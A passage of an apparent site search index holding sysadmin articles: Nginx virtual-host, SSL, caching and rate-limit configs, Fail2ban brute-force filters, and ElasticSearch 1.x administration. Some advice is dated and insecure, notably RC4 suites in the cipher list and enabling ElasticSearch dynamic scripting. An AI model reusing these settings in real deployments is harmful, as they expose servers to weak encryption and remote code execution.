/var/www/nginx-default/blog; index index.html index.htm index.php; } location /doc { root /usr/share; autoindex on; allow 127.0.0.1; deny all; } location /images { root /usr/share; autoindex on; } } Here, blog.deimos.fr will be accessible on port 80.\nLet’s activate this config:\nln -s /etc/nginx/sites-available/blog /etc/nginx/sites-enabled/blog All that remains is to reload the server and it works :-)\nhtaccess linkTo restrict access to some of your sites, here’s one of the oldest but effective solutions - htaccess! To enable them, we will need the htpasswd binary:\naptitude install apache2-utils We will now generate a file containing the logins and passwords with a first user:\nhtpasswd -c /etc/nginx/htaccess deimos Enter the password and you’re set. Let’s declare it in the config, in my previously created virtualhost:\nserver { listen 80; server_name blog.deimos.fr; access_log /var/log/nginx/localhost.access.log; location / { root /var/www/nginx-default/blog; index index.html index.htm index.php; auth_basic \"Restricted\"; auth_basic_user_file /etc/nginx/htaccess; } location /doc { root /usr/share; autoindex on; allow 127.0.0.1; deny all; } location /images { root /usr/share; autoindex on; } } All that remains is to reload the server and it works :-)\nDefault Port linkTo specify the default port, you can use an include in your configuration files that will call a file containing the port. This way it will be very easy to modify the default port in one go:\nlisten 80; And in the configuration files:\nserver { include listen_port.conf; [...] SSL linkInstallation linkFor SSL installation, compared to Apache which doesn’t natively and simply allow SSL on VirtualHosts, it’s much easier with Nginx:\naptitude install openssl Configuration linkFirst, we’ll generate SSL keys:\nmkdir -p /etc/nginx/ssl cd /etc/nginx/ssl openssl req -new -x509 -nodes -out server.crt -keyout server.key I put it in an ssl folder with the nginx config, but since you can have multiple certificates, I encourage you to create a hierarchy:\nserver { listen 443 ssl; server_name localhost; ssl_certificate /etc/nginx/ssl/server.crt; ssl_certificate_key /etc/nginx/ssl/server.key; # Resumption ssl_session_cache shared:SSL:10m; # Timeout ssl_session_timeout 10m; # Security options ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-RC4-SHA:ECDHE-RSA-RC4-SHA:ECDH-ECDSA-RC4-SHA:ECDH-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:RC4-SHA; ssl_prefer_server_ciphers on; # HSTS (force users to come in SSL if they've already been once) add_header Strict-Transport-Security \"max-age=31536000; includeSubdomains\"; access_log /var/log/nginx/localhost.access.log; location / { root /var/www/nginx-default/webmail; index index.html index.htm index.php; } # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ { root /var/www/nginx-default; include /etc/nginx/fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/nginx-default/$fastcgi_script_name; } } Let’s enable this config:\nln -s /etc/nginx/sites-available/webmail /etc/nginx/sites-enabled/webmail And restart the Nginx server for it to take effect.\nYou can test the security of your SSL server: https://www.ssllabs.com/ssltest/index.html\nForce SSL Connection linkIt is possible to configure your virtualhost in the normal way but to absolutely want a redirect to SSL. For this, it’s very simple, just add:\nserver { listen 80; server_name www.deimos.fr; rewrite ^ https://$server_name$request_uri? permanent; } FastCGI Cache linkFastCGI cache is useful to increase the speed of your website. We’ll allocate a few MB for the cache and put it in a tmpfs to speed things up even more. In the main configuration, we’ll create this cache:\n[...] http { [...] fastcgi_cache_path /usr/share/nginx/cache levels=1:2 keys_zone=mycache:10m inactive=1h max_size=256m; [...] } [...] Here I’m creating a cache called “mycache” with a size of 256MB.\nIn your VirtualHost configurations, add these lines:\n[...] location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } [...] Next we’ll create a tmpfs cache folder (read this doc for more info):\n[...] tmpfs /usr/share/nginx/cache tmpfs defaults,size=256m 0 0 [...] Then we’ll create the cache directory, mount it and restart nginx:\nmkdir /usr/share/nginx/cache mount /usr/share/nginx/cache /etc/init.d/nginx restart Maintenance Page linkHere’s an elegant way to create a maintenance page:\nserver { [...] location / { try_files /maintenance.html $uri $uri/ @maintenance; } location @maintenance { return 503; } } All you need to do is insert a maintenance.html page at the root of your site and this page will be displayed while you make your changes. You can also use this method:\nserver { [...] location / { if (-f $document_root/maintenance.html) { return 503; } [...] } error_page 503 @maintenance; location @maintenance { rewrite ^(.*)$ /maintenance.html break; } } Limit Flooding and Sniffers linkIt can happen that a malicious person tries to bring your server to its knees by making many requests that typically saturate PHP processes and make your CPUs go to 100%. To avoid this, it is possible to limit the number of requests per IP by using the limit_req module1. To enable this module, insert this line in your Nginx core (global) configuration:\nhttp { [...] # Flood/DoS protection limit_req_zone $binary_remote_addr zone=limit:10m rate=5r/s; limit_req_log_level notice; [...] } Here are the options used:\nzone=limit: IPs will be stored in a zone called limit of 10M. Provide enough space in this zone to avoid 503 errors if there is no more space. A 1M zone can contain 16,000 binary_remote_addr type entries. rate: we allow 5 requests per second. log_level: you can remove this line if you don’t want to know in the logs if the limits are reached. Here I want to track this kind of event. Next, we need to inform on which virtualhost or location we want to apply this security measure:\nlocation ~ \\.php$ { limit_req zone=limit burst=5 nodelay; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } Again we find options:\nzone: I use the limit zone previously declared in the http (core) configuration burst: I allow the burst to 5 maximum connections nodelay: if you want requests to still be served even if they are slowed down, use the nodelay parameter. All that remains is to restart nginx.\nApplication Configurations linkBy default, I use www.deimos.fr to redirect to other VirtualHosts:\nserver { include listen_port.conf; listen 443 ssl; server_name www.deimos.fr; access_log /var/log/nginx/www.deimos.fr_access.log; error_log /var/log/nginx/www.deimos.fr_error.log; # Blog redirect rewrite ^/$ $scheme://blog.deimos.fr permanent; rewrite ^/blog(/.*)?$ $scheme://blog.deimos.fr$1 permanent; # Blocnotesinfo redirect rewrite ^/blocnotesinfo(/.*)?$ $scheme://wiki.deimos.fr$1 permanent; # Piwik rewrite ^/piwik(/.*)?$ $scheme://piwik.deimos.fr$1 permanent; # Gitweb rewrite ^/gitweb(/.*)?$ $scheme://git.deimos.fr$1 permanent; # Drop config include drop.conf; } Server Status linkBy default, it’s possible to get information about the server status, like this:\nserver { include listen_port.conf; listen 443 ssl; server_name www.deimos.fr; access_log /var/log/nginx/www.deimos.fr_access.log; error_log /var/log/nginx/www.deimos.fr_error.log; # Nginx status location /server-status { # Turn on nginx stats stub_status on; # I do not need logs for stats access_log off; # Allow from localhost allow 127.0.0.1; # Deny others deny all; } # PHP-FPM status location /php-fpm_status { include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; # I do not need logs for stats access_log off; # Allow from localhost allow 127.0.0.1; # Deny others deny all; } # Cache APC location /apc-cache { root /usr/share/doc/php-apc; } location ~ \\.php$ { include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; # I do not need logs for stats access_log off; # Allow from localhost allow 127.0.0.1; # Deny others deny all; } # Blog redirect rewrite ^/$ $scheme://blog.deimos.fr permanent; rewrite ^/blog(/.*)?$ $scheme://blog.deimos.fr$1 permanent; # Blocnotesinfo redirect rewrite ^/blocnotesinfo(/.*)?$ $scheme://wiki.deimos.fr$1 permanent; # Piwik rewrite ^/piwik(/.*)?$ $scheme://piwik.deimos.fr$1 permanent; # Gitweb rewrite ^/gitweb(/.*)?$ $scheme://git.deimos.fr$1 permanent; # Drop config include drop.conf; } Configure the authorized addresses properly or place authentication via htpasswd.\nHere’s the result when accessing the page (http://www.deimos.fr/server-status):\nActive connections: 11 server accepts handled requests 8109 8109 58657 Reading: 0 Writing: 1 Waiting: 10 Wordpress linkFor the configuration of Wordpress under Nginx, here’s an example:\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name blog.deimos.fr; root /usr/share/nginx/www/deimos.fr/blog; index index.php; access_log /var/log/nginx/blog.deimos.fr_access.log; error_log /var/log/nginx/blog.deimos.fr_error.log; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } # Drop config include drop.conf; # BEGIN W3TC Browser Cache gzip on; gzip_types text/css application/x-javascript text/x-component text/richtext image/svg+xml text/plain text/xsd text/xsl text/xml image/x-icon; location ~ \\.(css|js|htc)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(html|htm|rtf|rtx|svg|svgz|txt|xsd|xsl|xml)$ { expires 3600s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|eot|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|mpp|otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|ttf|ttc|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } # END W3TC Browser Cache # BEGIN W3TC Minify core rewrite ^/wp-content/w3tc/min/w3tc_rewrite_test$ /wp-content/w3tc/min/index.php?w3tc_rewrite_test=1 last; rewrite ^/wp-content/w3tc/min/(.+\\.(css|js))$ /wp-content/w3tc/min/index.php?file=$1 last; # END W3TC Minify core } } Mediawiki linkFor setting up Mediawiki with Nginx and short URLs, here’s the configuration to adopt. I’ve also added SSL and forced redirects from the login page to SSL:\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name wiki.deimos.fr wiki.m.deimos.fr; root /usr/share/nginx/www/deimos.fr/blocnotesinfo; client_max_body_size 5m; client_body_timeout 60; access_log /var/log/nginx/wiki.deimos.fr_access.log; error_log /var/log/nginx/wiki.deimos.fr_error.log; location / { rewrite ^/$ $scheme://$host/index.php permanent; # Short URL redirect try_files $uri $uri/ @rewrite; } location @rewrite { if (!-f $request_filename){ rewrite ^/(.*)$ /index.php?title=$1\u0026$args; } } # Force SSL Login set $ssl_requested 0; if ($arg_title ~ Sp%C3%A9cial:Connexion) { set $ssl_requested 1; } if ($scheme = https) { set $ssl_requested 0; } if ($ssl_requested = 1) { return 301 https://$host$request_uri; } # Drop config include drop.conf; # Deny direct access to specific folders location ^~ /(maintenance|images)/ { return 403; } location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; } location = /_.gif { expires max; empty_gif; } location ^~ /cache/ { deny all; } location /dumps { root /usr/share/nginx/www/deimos.fr/blocnotesinfo/local; autoindex on; } # BEGIN W3TC Browser Cache gzip on; gzip_types text/css application/x-javascript text/x-component text/richtext image/svg+xml text/plain text/xsd text/xsl text/xml image/x-icon; location ~ \\.(css|js|htc)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(html|htm|rtf|rtx|svg|svgz|txt|xsd|xsl|xml)$ { expires 3600s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; } location ~ \\.(asf|asx|wax|wmv|wmx|avi|bmp|class|divx|doc|docx|eot|exe|gif|gz|gzip|ico|jpg|jpeg|jpe|mdb|mid|midi|mov|qt|mp3|m4a|mp4|m4v|mpeg|mpg|mpe|mpp|otf|odb|odc|odf|odg|odp|ods|odt|ogg|pdf|png|pot|pps|ppt|pptx|ra|ram|svg|svgz|swf|tar|tif|tiff|ttf|ttc|wav|wma|wri|xla|xls|xlsx|xlt|xlw|zip)$ { expires 31536000s; add_header Pragma \"public\"; add_header Cache-Control \"public, must-revalidate, proxy-revalidate\"; add_header X-Powered-By \"W3 Total Cache/0.9.2.4\"; try_files $uri $uri/ @rewrite; } # END W3TC Browser Cache } Gitweb linkWith Nginx, you need to allow certain extensions in php-fpm:\n[...] security.limit_extensions = .php .php3 .php4 .php5 .cgi [...] And here’s a configuration example to adapt to your needs:\nserver { listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name git.deimos.fr; root /usr/share/gitweb/; access_log /var/log/nginx/git.deimos.fr_access.log; error_log /var/log/nginx/git.deimos.fr_error.log; index gitweb.cgi; location /gitweb.cgi { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/run/fcgiwrap.socket; } } Next we’ll need a cgi wrapper:\naptitude install fcgiwrap Create the link, then reload the configuration:\ncd /etc/nginx/sites-enabled ln -s /etc/nginx/sites-available/git.deimos.fr . /etc/init.d/nginx reload /etc/init.d/fcgiwrap restart /etc/init.d/php5-fpm reload Git linkI spent quite a bit of time making Git over http(s) and Gitweb coexist, but I got it working.\ninfo Prefer the Gitweb method only if you don’t need git over http(s) Here’s the method I used:\nserver { listen 80; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name git.deimos.fr; root /usr/share/gitweb/; access_log /var/log/nginx/git.deimos.fr_access.log; error_log /var/log/nginx/git.deimos.fr_error.log; index gitweb.cgi; # Drop config include drop.conf; # Git over https location /git/ { alias /var/cache/git/; if ($scheme = http) { rewrite ^ https://$host$request_uri permanent; } } # Gitweb location ~ gitweb\\.cgi { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/run/fcgiwrap.socket; } } Here I have my git over https working (http is redirected to https) and my gitweb also since everything that matches gitweb.cgi is matched. Now, for the git part, we’ll need to authorize the repositories we want. For this, we’ll need to rename a file in our repository and run a command:\ncd /var/cache/git/myrepo.git hooks/post-update{.sample,} su - www-data -c 'cd /var/cache/git/myrepo.git \u0026\u0026 /usr/lib/git-core/git-update-server-info' Replace www-data with the user who has rights to the repository. Use www-data so that nginx has the rights. Then, you have permission to clone:\ngit clone http://www.deimos.fr/git/deimosfr.git deimosfr Piwik linkFor Piwik, here’s the configuration:\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name piwik.deimos.fr; root /usr/share/nginx/www/deimos.fr/piwik; index index.php; access_log /var/log/nginx/piwik.deimos.fr_access.log; error_log /var/log/nginx/piwik.deimos.fr_error.log; # Drop config include drop.conf; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } location ~* \\.(js|css|png|jpg|jpeg|gif|ico)$ { expires max; log_not_found off; } } ownCloud linkownCloud 4.X linkHere’s the configuration for ownCloud 4.X with Nginx:\nserver { include listen_port.conf; listen 443 default ssl; ssl on; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; server_name owncloud.deimos.fr; root /usr/share/nginx/www/deimos.fr/owncloud; index index.php; client_max_body_size 1024M; access_log /var/log/nginx/cloud.deimos.fr_access.log; error_log /var/log/nginx/cloud.deimos.fr_error.log; # Force SSL if ($scheme = http) { return 301 https://$host$request_uri; } # deny direct access location ~ ^/(data|config|\\.ht|db_structure\\.xml|README) { deny all; } # default try order location / { try_files $uri $uri/ @webdav; } # owncloud WebDAV location @webdav { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; fastcgi_split_path_info ^(.+\\.php)(/.*)$; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param HTTPS on; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } location ~ \\.php$ { try_files $uri = 404; fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param HTTPS on; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } # Drop config include drop.conf; } ownCloud 5.X linkAnd for version 5:\nserver { include listen_port.conf; listen 443 default ssl; ssl on; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; server_name cloud.deimos.fr; root /usr/share/nginx/www/deimos.fr/owncloud; index index.php; client_max_body_size 1024M; access_log /var/log/nginx/cloud.deimos.fr_access.log; error_log /var/log/nginx/cloud.deimos.fr_error.log; # Force SSL if ($scheme = http) { return 301 https://$host$request_uri; } rewrite ^/caldav((/|$).*)$ /remote.php/caldav$1 last; rewrite ^/carddav((/|$).*)$ /remote.php/carddav$1 last; rewrite ^/webdav((/|$).*)$ /remote.php/webdav$1 last; error_page 403 = /core/templates/403.php; error_page 404 = /core/templates/404.php; location ~ ^/(data|config|\\.ht|db_structure\\.xml|README) { deny all; } location / { rewrite ^/.well-known/host-meta /public.php?service=host-meta last; rewrite ^/.well-known/host-meta.json /public.php?service=host-meta-json last; rewrite ^/.well-known/carddav /remote.php/carddav/ redirect; rewrite ^/.well-known/caldav /remote.php/caldav/ redirect; rewrite ^(/core/doc/[^\\/]+/)$ $1/index.html; try_files $uri $uri/ index.php; } location ~ ^(?"
            }
        );
    index.add(
            {
                id:  169 ,
                href: "\/Fail2ban_:_mise_en_place_de_r%C3%A8gles_automatis%C3%A9es_iptables_pour_contrer_les_attaques_par_bruteforce\/",
                title: "Fail2ban: Implementing automated iptables rules to counter bruteforce attacks",
                description: "How to implement Fail2ban to automatically create iptables rules that block IP addresses attempting bruteforce attacks on your services.",
                content: "Introduction linkFail2ban scans log files (e.g. /var/log/apache/error_log) and bans IPs that show malicious signs – too many password failures, seeking for exploits, etc. Generally Fail2Ban is then used to update firewall rules to reject the IP addresses for a specified amount of time, although any arbitrary other action (e.g. sending an email) could also be configured. Out of the box Fail2Ban comes with filters for various services (apache, courier, ssh, etc).\nFail2Ban is able to reduce the rate of incorrect authentication attempts however it cannot eliminate the risk that weak authentication presents. Configure services to use only two factor or public/private authentication mechanisms if you really want to protect services.\nInstallation link aptitude install fail2ban Configuration linkYou may want to add your own rules. Here are examples.\nWordpress linkI want to block bruteforce on my Wordpress installation. Unfortunately Wordpress does not return 403 errors when an authentication fails. So we have to:\nJail linkAdd this in your jail.conf to check access and error log files (/etc/fail2ban/jail.conf):\n[wp-auth-errors] enabled = true port = http,https filter = wp-auth-error logpath = /var/log/nginx/*error*.log bantime = 3600 maxretry = 6 [wp-auth-access] enabled = true port = http,https filter = wp-auth-access logpath = /var/log/nginx/*access*.log bantime = 3600 maxretry = 6 Filters linkHere is the filter for access. It’s a regex to catch the IP address in the log file (/etc/fail2ban/filter.d/wp-auth-access.conf):\n# WordPress brute force auth filter # # Block IPs trying to auth wp wordpress # [Definition] failregex = ^ -.*\"POST.*(wp-login|xmlrpc)\\.php ignoreregex = And for error logs (/etc/fail2ban/filter.d/wp-auth-error.conf):\n# WordPress brute force auth filter # # Block IPs trying to auth wp wordpress # [Definition] failregex = ^.*client: ,.*\"POST.*(wp-login|xmlrpc)\\.php ignoreregex = Validate filters and configuration linkYou can validate the configuration of your filters like this:\nfail2ban-regex Usage linkUnban someone linkThis solution is to ask iptables to unban an IP. But Fail2ban won’t be aware of that and will still think that the attacker is blocked if you do not use solution one, until the maximum blocking retention time is reached.\nGet the current chains list:\n\u003e iptables -L | grep ^Chain Chain INPUT (policy ACCEPT) Chain FORWARD (policy ACCEPT) Chain OUTPUT (policy ACCEPT) Chain fail2ban-nginx-naxsi (2 references) Chain fail2ban-ssh (1 references) If you do not know on which chain your IP has been blocked, remove the grep command.\nThen ask iptables to see the current blocked IPs on a specific chain:\n\u003e iptables -L fail2ban-nginx-naxsi -v -n --line-numbers Chain fail2ban-nginx-naxsi (1 references) num pkts bytes target prot opt in out source destination 1 315 75198 RETURN all -- * * 0.0.0.0/0 0.0.0.0/0 2 16 1704 DROP all -- * * 222.2.5.210 0.0.0.0/0 Now I want to remove the second line:\niptables -D fail2ban-nginx-naxsi 2 To finish, inform fail2ban to unban someone:\nfail2ban-client get nginx-naxsi actionunban 222.2.5.210 Modify nginx-naxsi with the name of the fail2ban jail name.\nResources linkFail2ban Documentation\n"
            }
        );
    index.add(
            {
                id:  170 ,
                href: "\/ElasticSearch:_powerful_search_and_analytics_engine\/",
                title: "ElasticSearch: Powerful Search and Analytics Engine",
                description: "A guide to set up and use ElasticSearch, a flexible and powerful open source distributed real-time search and analytics engine.",
                content: " Introduction linkElasticsearch is a flexible and powerful open source, distributed, real-time search and analytics engine. Architected from the ground up for use in distributed environments where reliability and scalability are must haves, Elasticsearch gives you the ability to move easily beyond simple full-text search. Through its robust set of APIs and query DSLs, plus clients for the most popular programming languages, Elasticsearch delivers on the near limitless promises of search technology.\nBasics concepts linkHere are a some Lucene information that you need to know:\nAll the information of the structures are called inverted index. You can’t modify, only delete then insert. Deletes (like on MariaDB XtraDB called “optimize”) creates fragmentation. To merge data this process is called segment merge. Input data linkData analysis is made by the analyser which is built of a tokenizer and zero or more token filters, and it can also have zero or more character mappers. A tokenizer in Lucene is used to split the text into tokens and is built of zero or more token filters.\nFilters are processed sequentially. The character mappers are used before the tokenizer. For example you can remove HTML tags with it.\ninfo Remove all unnecessary fields like html tags to avoid mistaken scoring Index linkA query may be not analyzed (you can decide). For example, the prefix and the term queries are not analyzed while the match query is! In ElasticSearch, an index is like a table in MariaDB. Data is stored in JSON format called a “document”.\nArchitecture linkElasticSearch knows how to work in standalone mode or is able to work in cluster. Cluster implies Sharding + Replication: When you send a new document to the cluster, you specify a target index and send it to one node (any of available nodes). In cluster mode, ElasticSearch gateways forwards their data to the primary node. In a cluster, there is only one writing node that can switch to another node if this one falls down.\nInstallation linkTo install ElasticSearch, you can take the last stable version available on the official repository. First of all install the repository key:\ncd /tmp wget -O - http://packages.elasticsearch.org/GPG-KEY-elasticsearch | apt-key add - Add the repository file:\ndeb http://packages.elasticsearch.org/elasticsearch/1.3/debian stable main Now install elasticsearch with the dependencies:\naptitude install elasticsearch openjdk-7-jre-headless openntpd To finish configure the init file:\nupdate-rc.d elasticsearch defaults 95 10 Configuration linkFile descriptors linkTo avoid reaching maximum file descriptor, you have to update the limits.conf file with those settings:\nelasticsearch soft nofile 32000 elasticsearch hard nofile 32000 JVM linkRegarding the JVM parameters, it’s recommended to use 1G (XMX) for small deployments. Check out your logs to see indications about OutOfMemoryError exceptions ‘ES_HEAP_SIZE’ variable size.\ninfo You should avoid to allocate 50% of your total system memory to the JVM. Cluster linkDepending on the configuration you want to have (single or cluster), you have to edit 2 values in the default configuration file:\ncluster.name: elasticsearch node.name: \"Node 1\" cluster.name: set it if you want your server to join a cluster. node.name: set a hostname. If not set, it will take the server hostname. Dynamic scripting linkYou may want to enable dynamic scripting to do advanced query in cli. To enable it, add it in the configuration:\nscript.disable_dynamic: false Administration linkCheck health linkYou can check your cluster health like this:\n\u003e curl -XGET http://127.0.0.1:9200/_cluster/health?pretty { \"cluster_name\" : \"elasticsearch\", \"status\" : \"green\", \"timed_out\" : false, \"number_of_nodes\" : 3, \"number_of_data_nodes\" : 3, \"active_primary_shards\" : 5, \"active_shards\" : 10, \"relocating_shards\" : 0, \"initializing_shards\" : 0, \"unassigned_shards\" : 0 } Get nodes information linkTo get information regarding nodes, you can use ‘cat’:\n\u003e curl -XGET \"http://127.0.0.1:9200/_cat/nodes?v\u0026h=name,id,ip,port,v,m\" name id ip port v m node1 YbCv 192.168.33.31 9300 1.2.2 m node2 kXy7 192.168.33.32 9300 1.2.2 m node3 VNK9 192.168.33.33 9300 1.2.2 * The interesting things here are the master node (last column defined by ‘*’).\nOr you can use this:\n\u003e curl -XGET \"http://127.0.0.1:9200/_nodes/process?pretty\" { \"cluster_name\" : \"elasticsearch\", \"nodes\" : { \"c8AX1atwQ6C2hl13_S0r4g\" : { \"name\" : \"node3\", \"transport_address\" : \"inet[/192.168.33.33:9300]\", \"host\" : \"node3\", \"ip\" : \"192.168.33.33\", \"version\" : \"1.2.2\", \"build\" : \"9902f08\", \"http_address\" : \"inet[/192.168.33.33:9200]\", \"process\" : { \"refresh_interval_in_millis\" : 1000, \"id\" : 3457, \"max_file_descriptors\" : 65535, \"mlockall\" : false } }, \"pmsqiKGHRMGEo3iWaxv3Gw\" : { \"name\" : \"node1\", \"transport_address\" : \"inet[/192.168.33.31:9300]\", \"host\" : \"node1\", \"ip\" : \"192.168.33.31\", \"version\" : \"1.2.2\", \"build\" : \"9902f08\", \"http_address\" : \"inet[/192.168.33.31:9200]\", \"process\" : { \"refresh_interval_in_millis\" : 1000, \"id\" : 3480, \"max_file_descriptors\" : 65535, \"mlockall\" : false } }, \"xVXb40pgRNKdd9G6u8-7Uw\" : { \"name\" : \"node2\", \"transport_address\" : \"inet[/192.168.33.32:9300]\", \"host\" : \"node2\", \"ip\" : \"192.168.33.32\", \"version\" : \"1.2.2\", \"build\" : \"9902f08\", \"http_address\" : \"inet[/192.168.33.32:9200]\", \"process\" : { \"refresh_interval_in_millis\" : 1000, \"id\" : 3886, \"max_file_descriptors\" : 65535, \"mlockall\" : false } } } } To get more information and options, look at the official documentation.\nShutdown a node linkTo shutdown a specific node, use that curl command and replace the nodeid with the desired id number:\n\u003e curl -XPOST http://127.0.0.1:9200/_cluster/nodes//_shutdown?pretty { \"cluster_name\" : \"elasticsearch\", \"nodes\" : { \"zfnG3AKMShad0Ti9qgchFQ\" : { \"name\" : \"node2\" } } } Shutdown the cluster linkIf you want to shutdown the whole cluster at once:\n\u003e curl -XPOST http://127.0.0.1:9200/_cluster/nodes/_shutdown?pretty { \"cluster_name\" : \"elasticsearch\", \"nodes\" : { \"FKCjz60DRgWCat7WE9NkBQ\" : { \"name\" : \"node3\" }, \"IfQBC4VrRICLyO5pNsohHA\" : { \"name\" : \"node1\" }, \"kzlYH_8rRBmWXCdZIjYrlQ\" : { \"name\" : \"node2\" } } } Usage linkCreate a new entry linkTo create a new entry with it’s automated index, you simply needs to insert like this:\n\u003e curl -XPUT http://localhost:9200/vehicule/moto/1?pretty -d '{\"vendor\": \"Kawazaki\", \"model\": \"Z1000\", \"tags\": [\"sports\", \"roadster\"] }' { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"1\", \"_version\" : 1, \"created\" : true } If everything was fine, you should have “created” value to true. Each time there will be an update on the document, the version will automatically increase. If you do not specify the id, it will automatically be generated:\n\u003e curl -XPOST http://localhost:9200/vehicule/moto/?pretty -d '{\"vendor\": \"Kawazaki\", \"model\": \"Z1000\", \"tags\": [\"sports\", \"roadster\"] }' { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"q1mSSqHbSqCuOHLdUGVLYQ\", \"_version\" : 1, \"created\" : true } Get a document linkTo get a document (an entry), this is simple:\n\u003e curl -XGET http://localhost:9200/vehicule/moto/1?pretty { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"1\", \"_version\" : 1, \"found\" : true, \"_source\":{\"vendor\": \"Kawazaki\", \"model\": \"Z1000\", \"tags\": [\"sports\", \"roadster\"] } } You only have to know the id. If a document is not found:\n\u003e curl -XGET http://localhost:9200/vehicule/moto/4?pretty { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"4\", \"found\" : false } You’ll get found value set to false\nUpdate a document linkLucene doesn’t know how to update a document. So when you’ll ask to ElasticSearch to update a document, you will in fact delete the current and create a new one. To modify a document (here the model value), you can do it like that:\n\u003e curl -XPOST http://localhost:9200/vehicule/moto/1/_update?pretty -d '{\"script\": \"ctx._source.model = \\\"Z800\\\"\"}' { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"1\", \"_version\" : 2 } As you can see the version number has been incremented.\nTo add a new field to a current document:\ncurl -XPOST 'localhost:9200/vehicule/moto/1/_update?pretty' -d '{ \u003e \"script\" : \"ctx._source.power = \\\"139cv\\\"\" \u003e }' { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"1\", \"_version\" : 11 } If you want to add a tag in the current tag list of a document:\n\u003e curl -XPOST 'localhost:9200/vehicule/moto/1/_update?pretty' -d '{ \"script\" : \"ctx._source.tags += tag\", \"params\" : { \"tag\" : \"white/orange\" } }' { \"_index\" : \"vehicule\", \"_type\" : \"moto\", 